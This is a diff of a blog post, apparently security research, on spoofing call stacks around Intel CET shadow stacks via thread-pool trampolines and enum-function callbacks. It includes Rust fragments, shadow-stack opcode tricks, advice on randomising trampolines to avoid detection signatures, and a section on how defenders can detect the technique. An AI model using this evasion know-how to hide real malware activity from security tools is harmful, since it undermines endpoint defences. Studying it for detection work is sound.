@@ -846,7 +915,7 @@ The reconciliation loop finds the discrepancy and advances the SSP. The shadow s
 After the syscall is successfully executed, `ZwProtectVirtualMemory` correctly returns to `Internal_EnumSystemLocales`, proving that the callstack and the shadow stack are perfectly aligned with each other:
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ssp_vs_cs_after_syscall.png" alt="Shadow stack vs Normal stack after syscall">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ssp_vs_cs_after_syscall.png" alt="Shadow stack vs Normal stack after syscall">
     <br>
     <em>Shadow stack vs Normal stack after syscall</em>
 </p>
@@ -881,7 +950,7 @@ rustflags = [
 If the technique had a CET bug, the process would crash during testing. It doesn't.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/PE_DLL_Characteristics.png" alt="PE DLL Characteristics">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/PE_DLL_Characteristics.png" alt="PE DLL Characteristics">
     <br>
     <em>PE DLL Characteristics</em>
 </p>
@@ -892,7 +961,7 @@ If the technique had a CET bug, the process would crash during testing. It doesn
 
 ### 7.1 The Complete List
 
-I identified 39 callback-accepting functions across `kernel32.dll` and `kernelbase.dll` suitable as trampolines. In the PoC, only `EnumSystemLocalesEx` is used for simplicity, but in a real implementation these can be selected randomly at each `syscall` invocation to prevent stable stack fingerprints.
+I identified 39 callback-accepting functions across `kernel32.dll` and `kernelbase.dll` suitable as signed middle frames. In the PoC, only `EnumSystemLocalesEx` is used for simplicity, but in a real implementation these can be selected randomly at each `syscall` invocation to prevent stable stack fingerprints and thus significantly increase runtime polymorphism.
 
 | # | Function | Module |
 |---|---|---|
@@ -938,17 +1007,17 @@ I identified 39 callback-accepting functions across `kernel32.dll` and `kernelba
 
 ### 7.2 Why These Functions Work
 
-These functions share a property that makes them perfect for this technique: they stop enumeration when the callback returns 0.
+These functions share a property that makes them perfect for this technique: they stop enumeration when the callback returns `0`.
 
 Here's the trick. When the `syscall` executes through the trampoline, `RAX` ends up holding the `NTSTATUS` result. Then `ret` returns to `Internal_EnumSystemLocales` (or equivalent), which looks at `EAX` as if it were the callback's return value.
 
 NT syscalls return `STATUS_SUCCESS` on success. Guess what `STATUS_SUCCESS` is? Zero.
 
-And what does the enum function do when the callback returns 0? It interprets it as `FALSE` ("stop enumerating") and quits.
+And what does the enum function do when the callback returns `0`? It interprets it as `FALSE` ("stop enumerating") and quits.
 
-So in the success case: `syscall` returns 0, enum function stops, callback called only once, done. Clean, efficient, no extra invocations.
+So in the success case: `syscall` returns `0`, enum function stops, callback called only once, done. Clean, efficient, no extra invocations.
 
-In the failure case: `syscall` returns some non-zero `NTSTATUS`, enum function interprets it as `TRUE` ("keep going"), calls the callback again. That second invocation is Phase 3, which forcefully returns 0 to stop.
+In the failure case: `syscall` returns some non-zero `NTSTATUS`, enum function interprets it as `TRUE` ("keep going"), calls the callback again. That second invocation is Phase 3, which forcefully returns `0` to stop.
 
 This alignment between `NTSTATUS` success and the callback's "stop" value is not a coincidence. It's precisely why I selected these 39 functions: they all respect this convention.
 
@@ -966,15 +1035,15 @@ So not every enum function can support every `syscall` argument count. In the fu
 2. The callback captures the return address and the `RSP` at entry
 3. Walk back through the call stack with `RtlVirtualUnwind` to measure how many bytes the enum function's prologue allocated on the stack
 4. Divide by 8 to get the number of 8-byte slots available
-5. Cap at the function's declared arity (just in case the prologue reserves more than needed)
+5. Clamp the result against a per-function safe maximum, determined empirically by testing across multiple Windows builds; the final `max_args` is the smaller of the two values
 
 The result is a `max_args` value for each function. When dispatching a `syscall`, the dispatcher picks a random enum function from those whose `max_args` is at least as large as the `syscall`'s argument count.
 
-For example, `EnumSystemCodePagesA` might support up to 5 arguments, while `EnumResourceLanguagesW` supports up to 11. A `syscall` with 10 arguments can only use the latter.
+For example, `EnumSystemCodePagesA` might support up to 5 arguments, while `EnumResourceLanguagesW` supports up to 11 (actually, it might even be more than 11, but I've never tested this code with system calls that require more than 11 parameters). A `syscall` with 10 arguments can only use the latter.
 
 This profiling has to be done on each Windows build, because the amount of stack space each function allocates can change between releases as Microsoft recompiles the code. I have tested this across multiple Windows versions from Win8 onward, and let me tell you, it was not a fun experience. More on this in [Section 8.1](#81-the-enum-function-crashes).
 
-### 7.4 A Note on InitOnceExecuteOnce
+### 7.4 A Note on `InitOnceExecuteOnce`
 
 The attentive reader will have noticed that `InitOnceExecuteOnce` is not, strictly speaking, an "Enum" function. It doesn't enumerate anything. It's a one-shot initialization primitive: it calls your callback exactly once (if the `INIT_ONCE` block hasn't been initialized yet) and never calls it again.
 
@@ -983,7 +1052,7 @@ So why is it in the list? Because it satisfies all the same requirements:
 1. It accepts a callback pointer
 2. It calls the callback at least once (assuming the `INIT_ONCE` block is fresh, which we ensure
    by zeroing it before each use)
-3. When the callback returns 0 (`FALSE`), it treats the initialization as failed and doesn't do
+3. When the callback returns `0` (`FALSE`), it treats the initialization as failed and doesn't do
    anything weird
 4. It lives in `kernelbase.dll`
 5. It creates a legitimate frame on the call stack
@@ -992,7 +1061,7 @@ Its calling convention is slightly different (the callback receives an `LPINIT_O
 
 Including non-Enum functions that satisfy the requirements is deliberate: the more diverse the pool, the harder it is to build a detection signature.
 
-### 7.5 Why Not user32.dll?
+### 7.5 Why Not `user32.dll`?
 
 `user32.dll` has plenty of enum functions too: `EnumWindows`, `EnumDesktopWindows`,
 `EnumDisplayMonitors`, etc. I intentionally excluded them because `user32.dll` is not loaded by default in every process.
@@ -1011,24 +1080,33 @@ The first version of the full implementation (not the PoC) used a hardcoded tabl
 
 The problem: Microsoft recompiles these functions between releases, and the prologue might allocate a different amount of stack space. A function that happily supported 8 `syscall` arguments on Windows 10 21H2 would crash on 22H2 because it now allocates 16 fewer bytes in its prologue. My 8th argument was overwriting a saved register.
 
-The fix was the runtime profiler I described in [7.3](#73-not-all-functions-support-all-syscall-argument-counts). Instead of a hardcoded table, each function's stack frame is measured at startup by calling it once with a special callback. This adds a few milliseconds of initialization time, but it's worth it: the technique is now resilient across Windows builds without manual maintenance.
+The fix was a two-layer approach. The runtime profiler I described in [7.3](#73-not-all-functions-support-all-syscall-argument-counts) measures each function's available stack space at startup. But the profiler's result alone isn't trusted blindly, it's clamped against a per-function safe maximum that I determined empirically by testing across every supported Windows build (≥ 8 and Server ≥ 2012). The final `max_args` is the smaller of the two values.
 
-I tested this across Windows >= 8, and Windows Server >= 2012. Every time I thought I was done, a new build would break a function I thought was safe. Good times.
+Finding those empirical caps was the painful part. Every time I thought I had the right values, a different build would break a function I assumed was safe. The profiler handles the dynamic side (it adapts if a future Windows build changes a prologue), while the empirical caps act as a safety net to catch cases the profiler can't see.
 
 ### 8.2 The Thread Pool Crashes
 
 Even after the enum function profiling was working, I kept getting crashes in the thread pool internals. The worker would execute, the enum callback would run, the `syscall` would succeed... and then the process would die on its way back to `TppWorkpExecute`.
 
-The culprit: incorrect stack restoration. In Phase 1, when I redirect execution to the enum function, I overwrite three stack slots (at RSP+0x20, RSP+0x28, RSP+0x30) with the enum function's 5th/6th/7th arguments. These slots belong to the thread pool worker's caller (the internal TP code). When the enum function returns and the TP code tries to read its own local state from those positions, it finds my zeroes instead. Crash.
+The culprit: incorrect stack restoration. In Phase 1, when I redirect execution to the enum function, I overwrite three stack slots (at `RSP+0x20`, `RSP+0x28`, `RSP+0x30`) with the enum function's 5th/6th/7th arguments. These slots belong to the thread pool worker's caller (the internal TP code). When the enum function returns and the TP code tries to read its own local state from those positions, it finds my zeroes instead. Crash.
 
-The fix is what you see in the enum callback's preamble: at the very beginning, before doing anything else, restore those three slots to their original values. The values were backed up in Phase 1 (`backup_addr/val_arg5/6/7`). The restore is idempotent: after restoring, the backup address is set to 0 so a second invocation doesn't double-write.
+The fix is what you see in the enum callback's preamble: at the very beginning, before doing anything else, restore those three slots to their original values. The values were backed up in Phase 1 (`backup_addr/val_arg5/6/7`). The restore is idempotent: after restoring, the backup address is set to `0` so a second invocation doesn't double-write.
 
 ```rust
 if args.backup_addr_arg5 != 0 {
     unsafe { write_volatile(args.backup_addr_arg5 as *mut u64, args.backup_val_arg5) };
     args.backup_addr_arg5 = 0;
 }
-// ... same for 6 and 7 ...
+
+if args.backup_addr_arg6 != 0 {
+    unsafe { write_volatile(args.backup_addr_arg6 as *mut u64, args.backup_val_arg6) };
+    args.backup_addr_arg6 = 0;
+}
+
+if args.backup_addr_arg7 != 0 {
+    unsafe { write_volatile(args.backup_addr_arg7 as *mut u64, args.backup_val_arg7) };
+    args.backup_addr_arg7 = 0;
+}
 ```
 
 This was one of those bugs where the crash happened in system code (the TP internals), the debugger showed a corrupted frame, and there was zero indication of what went wrong. It took me days of staring at hex dumps of the stack to figure out which bytes were being clobbered and by whom.
@@ -1039,7 +1117,7 @@ This one is embarrassing in hindsight, but it drove me crazy at the time.
 
 When I first wrote the stack slot backup code in Phase 1, I calculated the positions using `sp_orig` (which is `new_rsp`, i.e., the parent's RSP minus 8). So:
 
-```
+```rust
 sp_orig.add(4) = new_rsp + 0x20 = (parent_rsp - 8) + 0x20 = parent_rsp + 0x18
 ```
 
@@ -1051,22 +1129,22 @@ Once I realized the offset was wrong, the fix was simple. But finding it? I had 
 
 The moral of the story: when you're manually building stack frames, off-by-one means off-by-eight on x64. And off-by-eight means your code works 90% of the time but crashes in the other 10% with no obvious pattern.
 
-### 8.4 INCSSPD vs INCSSPQ: The 4-Byte Misalignment
+### 8.4 `INCSSPD` vs `INCSSPQ`: The 4-Byte Misalignment
 
 This one wins the award for "most bytes of damage per character of source code." One missing byte in an opcode. Weeks of confusion.
 
 The original implementation used `INCSSPD` (the 32-bit variant) to advance the shadow stack pointer:
 
-```
-.byte 0xF3, 0x0F, 0xAE, 0xE9    ; INCSSPD ecx, advances SSP by ecx × 4 bytes
+```rust
+.byte 0xF3, 0x0F, 0xAE, 0xE9    // INCSSPD ecx, advances SSP by ecx × 4 bytes
 ```
 
 On x64, shadow stack entries are 8 bytes. `INCSSPD` with `ecx=1` advances by 4 bytes, half an entry. The SSP ends up pointing to the *middle* of a return address. Every subsequent read from the shadow stack is garbage. The next `ret` compares the real return address against the upper 4 bytes of one entry concatenated with the lower 4 bytes of the next. `#CP` fault. Process dead.
 
 The fix is one byte, the REX.W prefix (`0x48`), to switch to the 64-bit variant:
 
-```
-.byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9    ; INCSSPQ rcx, advances SSP by rcx × 8 bytes
+```rust
+.byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9    // INCSSPQ rcx, advances SSP by rcx × 8 bytes
 ```
 
 The reason this bug survived so long: the original `user_mode_continue` was `#[inline(always)]`. With inlining, there's no `call` instruction, no stale shadow stack entry, and the `INCSSPQ` loop never fires. The bug was latent, structurally present but never executed. When I switched to `#[inline(never)]` (to make the CET reconciliation active), the loop finally ran, and the 4-byte misalignment immediately manifested as a `STATUS_STACK_BUFFER_OVERRUN` (fast-fail code `0x39`) at the trampoline's `ret`.
@@ -1074,7 +1152,7 @@ The reason this bug survived so long: the original `user_mode_continue` was `#[i
 The exception was at `ntdll!NtProtectVirtualMemory+0x14` (the `ret` after `syscall`). The callstack was perfect, every frame from a signed module. But the shadow stack was misaligned by 4 bytes, and CET didn't care how pretty the normal stack looked.
 
 <p align="center">
-    <img src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/STATUS_STACK_BUFFER_OVERRUN.png" alt="STATUS STACK BUFFER OVERRUN">
+    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/STATUS_STACK_BUFFER_OVERRUN.png" alt="STATUS STACK BUFFER OVERRUN">
     <br>
     <em>STATUS STACK BUFFER OVERRUN</em>
 </p>
@@ -1147,7 +1225,7 @@ Callbacks that fire during thread pool work items (unusual for locale enumeratio
 
 `SubmitThreadpoolWork` immediately followed by `WaitForThreadpoolWorkCallbacks` with very short execution times is unusual for legitimate async work.
 
-### 11.6 INCSSPQ Instruction Monitoring
+### 11.6 `INCSSPQ` Instruction Monitoring
 
 `INCSSPQ`/`INCSSPD` are rarely used in normal code. Performance counters or instruction traces flagging frequent use could indicate shadow stack manipulation.
 
